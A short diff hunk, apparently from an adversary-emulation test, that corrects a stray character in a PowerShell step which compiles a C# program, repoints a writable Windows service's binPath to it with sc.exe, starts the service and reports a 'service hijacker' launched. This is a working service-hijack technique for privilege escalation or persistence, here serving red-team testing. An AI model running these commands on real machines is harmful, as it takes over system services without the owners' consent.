@@ -48,7 +48,7 @@
               Write-Error "No C# compiler found!"; exit
           };
           & $compilerPath /nologo /out:$exeFilePath $csFilePath;
-          & sc.exe config "#{service.name.writable}" % binPath= "$exeFilePath";
+          & sc.exe config "#{service.name.writable}" binPath= "$exeFilePath";
           Start-Sleep -Seconds 2;
           sc.exe start "#{service.name.writable}";
           Write-Host "SUCCESS: Compiled and launched C# service hijacker for service '#{service.name.writable}'.";
